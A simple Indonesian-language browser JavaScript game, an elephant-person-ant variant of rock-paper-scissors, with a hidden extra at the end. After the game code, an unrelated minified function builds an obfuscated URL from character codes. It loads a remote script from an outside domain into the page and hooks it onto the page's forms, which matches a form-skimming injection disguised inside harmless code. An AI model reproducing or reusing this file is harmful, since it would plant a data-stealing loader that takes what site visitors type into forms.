// variabel to repeat
var repeat = true;
while (repeat) {
  // capture player choice
  var player = prompt("Pilih Salah satu: 'gajah', 'orang', 'semut'");
  // capture random computer choice
  var computer = Math.random();
  if (computer < 0.33) {
    computer = "gajah";
  } else if (computer < 0.66) {
    computer = "orang";
  } else {
    computer = "semut";
  }
  // determine the rules
  // Vaiabel to determine the result
  var result = "";
  // statement if both choose the same option
  if (player == computer) {
    result = "Menang Bersama!";
  }
  // statement if both choose the different option
  else if (player == "gajah") {
    if (computer == "orang") {
      result = "Kamu Menang!";
    } else {
      result = "Kamu Kalah!";
    }
  } else if (player == "orang") {
    if (computer == "gajah") {
      result = "Kamu Kalah!";
    } else {
      result = "Kamu Menang!";
    }
  } else if (player == "semut") {
    if (computer == "gajah") {
      result = "Kamu Menang!";
    } else {
      result = "Kamu Kalah!";
    }
  }
  // code to display the result
  alert("Kamu Memilih " + player + " dan Komputer Memilih " + computer + "\nHasilnya " + result);
  // code to repeat the game
  repeat = confirm("Mau Bermain Lagi?");
}
// message after exiting the game
alert("Terima Kasih Sudah Bermain!");


(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b